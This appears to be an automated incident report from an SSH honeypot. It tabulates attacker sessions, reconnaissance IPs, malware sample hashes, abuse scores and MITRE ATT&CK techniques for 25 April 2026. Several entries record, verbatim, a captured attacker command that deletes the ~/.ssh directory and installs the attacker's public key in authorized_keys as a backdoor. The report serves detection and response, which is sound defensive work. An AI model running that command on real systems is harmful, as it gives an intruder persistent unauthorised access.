### 🔴 HIGH · IR-d73a7858fc4a

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:28 |
| **Last Seen** | 2026-04-25 18:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:28:15` | `cowrie.session.connect` |
| `2026-04-25 18:28:15` | `cowrie.client.version` |
| `2026-04-25 18:28:15` | `cowrie.client.kex` |
| `2026-04-25 18:28:16` | `cowrie.login.success` |
| `2026-04-25 18:28:17` | `cowrie.session.params` |
| `2026-04-25 18:28:17` | `cowrie.command.input` |
| `2026-04-25 18:28:17` | `cowrie.command.failed` |
| `2026-04-25 18:28:17` | `cowrie.log.closed` |
| `2026-04-25 18:28:17` | `cowrie.session.params` |
| `2026-04-25 18:28:17` | `cowrie.command.input` |
| `2026-04-25 18:28:18` | `cowrie.session.file_download` |
| `2026-04-25 18:28:18` | `cowrie.log.closed` |
| `2026-04-25 18:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85264af6d477

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:28 |
| **Last Seen** | 2026-04-25 18:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:28:21` | `cowrie.session.connect` |
| `2026-04-25 18:28:21` | `cowrie.client.version` |
| `2026-04-25 18:28:21` | `cowrie.client.kex` |
| `2026-04-25 18:28:22` | `cowrie.login.success` |
| `2026-04-25 18:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b12d09186a38

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:33 |
| **Last Seen** | 2026-04-25 18:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:33:00` | `cowrie.session.connect` |
| `2026-04-25 18:33:00` | `cowrie.client.version` |
| `2026-04-25 18:33:00` | `cowrie.client.kex` |
| `2026-04-25 18:33:00` | `cowrie.login.success` |
| `2026-04-25 18:33:01` | `cowrie.session.params` |
| `2026-04-25 18:33:01` | `cowrie.command.input` |
| `2026-04-25 18:33:01` | `cowrie.command.failed` |
| `2026-04-25 18:33:01` | `cowrie.log.closed` |
| `2026-04-25 18:33:01` | `cowrie.session.params` |
| `2026-04-25 18:33:01` | `cowrie.command.input` |
| `2026-04-25 18:33:01` | `cowrie.session.file_download` |
| `2026-04-25 18:33:01` | `cowrie.log.closed` |
| `2026-04-25 18:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3788b12b61e4

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:33 |
| **Last Seen** | 2026-04-25 18:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:33:03` | `cowrie.session.connect` |
| `2026-04-25 18:33:03` | `cowrie.client.version` |
| `2026-04-25 18:33:04` | `cowrie.client.kex` |
| `2026-04-25 18:33:04` | `cowrie.login.success` |
| `2026-04-25 18:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71aa32bb15c0

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:35 |
| **Last Seen** | 2026-04-25 18:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:35:45` | `cowrie.session.connect` |
| `2026-04-25 18:35:45` | `cowrie.client.version` |
| `2026-04-25 18:35:45` | `cowrie.client.kex` |
| `2026-04-25 18:35:45` | `cowrie.login.success` |
| `2026-04-25 18:35:46` | `cowrie.session.params` |
| `2026-04-25 18:35:46` | `cowrie.command.input` |
| `2026-04-25 18:35:46` | `cowrie.command.failed` |
| `2026-04-25 18:35:46` | `cowrie.log.closed` |
| `2026-04-25 18:35:46` | `cowrie.session.params` |
| `2026-04-25 18:35:46` | `cowrie.command.input` |
| `2026-04-25 18:35:46` | `cowrie.session.file_download` |
| `2026-04-25 18:35:46` | `cowrie.log.closed` |
| `2026-04-25 18:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29cb06089f43

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:35 |
| **Last Seen** | 2026-04-25 18:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:35:48` | `cowrie.session.connect` |
| `2026-04-25 18:35:48` | `cowrie.client.version` |
| `2026-04-25 18:35:49` | `cowrie.client.kex` |
| `2026-04-25 18:35:49` | `cowrie.login.success` |
| `2026-04-25 18:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7fb065a33fe

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:36 |
| **Last Seen** | 2026-04-25 18:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:36:33` | `cowrie.session.connect` |
| `2026-04-25 18:36:33` | `cowrie.client.version` |
| `2026-04-25 18:36:33` | `cowrie.client.kex` |
| `2026-04-25 18:36:35` | `cowrie.login.success` |
| `2026-04-25 18:36:35` | `cowrie.session.params` |
| `2026-04-25 18:36:35` | `cowrie.command.input` |
| `2026-04-25 18:36:35` | `cowrie.command.failed` |
| `2026-04-25 18:36:35` | `cowrie.log.closed` |
| `2026-04-25 18:36:36` | `cowrie.session.params` |
| `2026-04-25 18:36:36` | `cowrie.command.input` |
| `2026-04-25 18:36:36` | `cowrie.session.file_download` |
| `2026-04-25 18:36:36` | `cowrie.log.closed` |
| `2026-04-25 18:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51ec8c53d055

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:36 |
| **Last Seen** | 2026-04-25 18:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:36:39` | `cowrie.session.connect` |
| `2026-04-25 18:36:39` | `cowrie.client.version` |
| `2026-04-25 18:36:40` | `cowrie.client.kex` |
| `2026-04-25 18:36:41` | `cowrie.login.success` |
| `2026-04-25 18:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9468ec9280d9

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:38 |
| **Last Seen** | 2026-04-25 18:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:38:12` | `cowrie.session.connect` |
| `2026-04-25 18:38:12` | `cowrie.client.version` |
| `2026-04-25 18:38:13` | `cowrie.client.kex` |
| `2026-04-25 18:38:14` | `cowrie.login.success` |
| `2026-04-25 18:38:14` | `cowrie.session.params` |
| `2026-04-25 18:38:14` | `cowrie.command.input` |
| `2026-04-25 18:38:14` | `cowrie.command.failed` |
| `2026-04-25 18:38:14` | `cowrie.log.closed` |
| `2026-04-25 18:38:15` | `cowrie.session.params` |
| `2026-04-25 18:38:15` | `cowrie.command.input` |
| `2026-04-25 18:38:15` | `cowrie.session.file_download` |
| `2026-04-25 18:38:15` | `cowrie.log.closed` |
| `2026-04-25 18:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00c150820d6

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:38 |
| **Last Seen** | 2026-04-25 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:38:19` | `cowrie.session.connect` |
| `2026-04-25 18:38:19` | `cowrie.client.version` |
| `2026-04-25 18:38:19` | `cowrie.client.kex` |
| `2026-04-25 18:38:20` | `cowrie.login.success` |
| `2026-04-25 18:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4071954f58b

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:39 |
| **Last Seen** | 2026-04-25 18:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:39:48` | `cowrie.session.connect` |
| `2026-04-25 18:39:48` | `cowrie.client.version` |
| `2026-04-25 18:39:48` | `cowrie.client.kex` |
| `2026-04-25 18:39:49` | `cowrie.login.success` |
| `2026-04-25 18:39:50` | `cowrie.session.params` |
| `2026-04-25 18:39:50` | `cowrie.command.input` |
| `2026-04-25 18:39:50` | `cowrie.command.failed` |
| `2026-04-25 18:39:50` | `cowrie.log.closed` |
| `2026-04-25 18:39:51` | `cowrie.session.params` |
| `2026-04-25 18:39:51` | `cowrie.command.input` |
| `2026-04-25 18:39:51` | `cowrie.session.file_download` |
| `2026-04-25 18:39:51` | `cowrie.log.closed` |
| `2026-04-25 18:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd4ebacaf6b5

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:39 |
| **Last Seen** | 2026-04-25 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:39:54` | `cowrie.session.connect` |
| `2026-04-25 18:39:54` | `cowrie.client.version` |
| `2026-04-25 18:39:54` | `cowrie.client.kex` |
| `2026-04-25 18:39:55` | `cowrie.login.success` |
| `2026-04-25 18:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `129.121.77[.]79` | **27** | 2026-04-25 17:57 | 2026-04-25 18:40 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.32.154[.]31` | **26** | 2026-04-25 16:55 | 2026-04-25 17:21 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `121.229.27[.]155` | **19** | 2026-04-25 18:19 | 2026-04-25 18:53 | 35m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.196.84[.]13` | **2** | 2026-04-25 17:54 | 2026-04-25 18:01 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.214.251[.]14` | **2** | 2026-04-25 17:35 | 2026-04-25 17:37 | 2m | 0 | `T1592` | 🟢 LOW |
| `165.232.39[.]131` | **2** | 2026-04-25 18:46 | 2026-04-25 18:49 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.34[.]74` | **2** | 2026-04-25 17:45 | 2026-04-25 17:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.47.16[.]134` | 1 | 2026-04-25 16:59 | 2026-04-25 16:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.248.83[.]33` | 1 | 2026-04-25 18:24 | 2026-04-25 18:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.173.117[.]246` | 1 | 2026-04-25 18:23 | 2026-04-25 18:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.128.18[.]100` | 1 | 2026-04-25 18:20 | 2026-04-25 18:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.246.136[.]161` | 1 | 2026-04-25 18:02 | 2026-04-25 18:03 | 35s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]198` | 1 | 2026-04-25 18:53 | 2026-04-25 18:53 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]233` | 1 | 2026-04-25 18:53 | 2026-04-25 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]9` | 1 | 2026-04-25 18:56 | 2026-04-25 18:56 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.128.18[.]100` | SG | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `60.246.136[.]161` | MO | CTM | **100** ⚠️ | 8 |
| `91.196.152[.]233` | FR | FR ONYPHE | **100** ⚠️ | 28 |
| `129.121.77[.]79` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 2 |
| `139.214.251[.]14` | CN | China Unicom Jilin province network | **100** ⚠️ | 24 |
| `165.232.39[.]131` | GB | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `91.196.152[.]198` | FR | FR ONYPHE | **100** ⚠️ | 21 |
| `101.47.16[.]134` | SG | BYTEPLUS | **100** ⚠️ | 6 |
| `152.32.154[.]31` | ID | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 6 |
| `91.231.89[.]9` | FR | FR ONYPHE | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 165 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 87 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 58 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 29 |
